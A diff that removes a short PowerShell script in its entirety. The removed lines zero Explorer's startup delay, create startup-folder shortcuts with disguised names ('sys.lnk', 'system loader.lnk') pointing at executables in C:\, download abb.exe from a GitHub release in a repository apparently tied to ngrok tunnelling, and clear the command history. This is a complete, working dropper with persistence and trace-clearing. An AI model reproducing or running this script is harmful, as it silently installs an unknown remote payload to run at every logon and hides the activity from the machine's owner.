@@ -1,16 +1,1 @@
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" -Name "Startupdelayinmsec" -Value 0 -Type DWord
 
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sys.lnk")
-$Shortcut.TargetPath = "C:\abb.exe"
-$Shortcut.WorkingDirectory = "C:\"
-$Shortcut.Save()
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\system loader.lnk")
-$Shortcut.TargetPath = "C:\system loader.exe"
-$Shortcut.WorkingDirectory = "C:\"
-$Shortcut.Save()
-
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\abb.exe")
-Clear-History
